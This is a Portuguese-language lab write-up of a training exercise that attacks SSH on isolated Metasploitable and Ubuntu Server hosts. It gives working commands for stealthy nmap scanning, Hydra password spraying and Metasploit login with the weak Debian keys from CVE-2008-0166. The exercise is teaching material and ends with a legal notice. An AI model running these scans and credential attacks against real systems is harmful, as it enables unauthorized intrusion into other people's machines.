# Desafio Explorando vulnerabilidades
> Cenário de laboratório voltado para reconhecimento, enumeração e exploração controlada em ambiente isolado.

## Objetivo

A proposta deste desafio é simular um cenário **GREY BOX** após sucesso com um ataque de phishing, utilizando:

- Kali Linux (máquina atacante)
- Metasploitable
- Ubuntu Server

O ambiente já possui conectividade de rede previamente configurada (host-only).

O objetivo é demonstrar:

- Técnicas de reconhecimento silencioso;
- Enumeração de serviços;
- Identificação de portas comuns entre hosts;
- Exploração de diferentes vetores de ataque no serviço SSH;
- Comparação entre:
  - um sistema vulnerável por software desatualizado;
  - um sistema atualizado, porém comprometido por credenciais fracas.
- Ganhar acesso. 

---


# ETAPA 1 — Reconhecimento

Buscando agir da forma mais silenciosa possível, foi utilizada a ferramenta `netdiscover`.
Foi utilizado o modo passivo (`-p`), permitindo escutar o tráfego ARP da rede sem enviar pacotes ativos para descoberta.

### Comando executado

```bash
sudo netdiscover -p -r 192.168.56.0/24
```

## Estratégia
Como o `netdiscover` em modo passivo depende de tráfego existente, foi realizado um ping da máquina Metasploitable para o Ubuntu Server, gerando tráfego suficiente para identificar os hosts ativos.

---

# ETAPA 2 — Enumeração com Nmap

Com os IPs identificados, foi realizado um scan silencioso utilizando o Nmap.

## Scan inicial

```bash
sudo nmap -sS -T2 -f --mtu 24 192.168.56.101-105
```

## Objetivo

Identificar:

* Hosts ativos;
* Portas abertas;
* Serviços em comum entre os alvos.

---

# Identificação do Serviço SSH

Após o reconhecimento inicial, foi realizado um scan específico para identificar a versão do serviço SSH em ambos os hosts.

## Ubuntu Server

```bash
sudo nmap -sS -Pn -n -sV -T1 -f --mtu 24 192.168.56.105 -p 22
```

## Metasploitable

```bash
sudo nmap -sS -Pn -n -sV -T1 -f --mtu 24 192.168.56.101 -p 22
```

---

# Escolha do Vetor de Ataque

Foi escolhido o serviço SSH para demonstrar dois cenários distintos:

# ETAPA 3 — Password Spraying no Ubuntu Server

Foi realizado um ataque de password spraying utilizando o Hydra.

## Objetivo

Demonstrar que sistemas atualizados sem vulnerabilidades conhecidasainda podem ser comprometidos devido ao uso de senhas fracas, ou seja, má-configuração/fator humano.

## Wordlist

Foi criada uma pequena wordlist contendo senhas comuns e fracas.

Arquivo:

```bash
wordlists/senhas_spray.txt
```

## Comando executado

```bash
hydra -l admin -P senhas_spray.txt -t 1 -V 192.168.56.105 ssh
```

---

# Acesso ao Alvo

Após identificar as credenciais válidas:

```bash
ssh admin@192.168.56.105
```

Com isso, foi obtido acesso ao servidor Ubuntu.

---

# ETAPA 4 — Exploração da Metasploitable

A máquina Metasploitable utiliza uma versão vulnerável do OpenSSH:

```text
OpenSSH 4.7p1 Debian/Ubuntu
```

Essa versão possui vulnerabilidades conhecidas, incluindo a:

## CVE-2008-0166

### Descrição

A vulnerabilidade ocorreu devido a uma modificação incorreta no OpenSSL do Debian/Ubuntu, resultando na geração de chaves criptográficas previsíveis.

Isso permitiu ataques baseados em chaves previamente calculadas.

---

# Download das chaves vulneráveis

```bash
wget https://hdm.io/tools/debian-openssl/debian_ssh_rsa_2048_x86.tar.bz2
```

## Extração

```bash
tar -xvjf debian_ssh_rsa_2048_x86.tar.bz2
```

---

# ETAPA 5 — Exploração com Metasploit

## Inicialização

```bash
msfconsole
```

## Seleção do módulo

```bash
use auxiliary/scanner/ssh/ssh_login_pubkey
```

## Configuração

```bash
set RHOST 192.168.56.101
set USERNAME root
set VERBOSE true
set KEY_PATH /home/kali/rsa/2048/
```

## Verificação das opções

```bash
show options
```

## Execução

```bash
run
```

---

# Interação com a sessão

```bash
sessions -i 1
```

---

# Considerações Finais

Este laboratório demonstra dois cenários importantes:

## Software seguro + fator humano

Mesmo sistemas atualizados podem ser comprometidos por:

* senhas fracas;
* reutilização de credenciais;
* má configuração.

## Software vulnerável

Sistemas desatualizados podem conter vulnerabilidades críticas conhecidas e amplamente exploráveis.

---

# Aviso Legal

Este conteúdo foi desenvolvido exclusivamente para fins educacionais e laboratoriais.

Não utilize essas técnicas em ambientes reais sem autorização explícita.

````
---
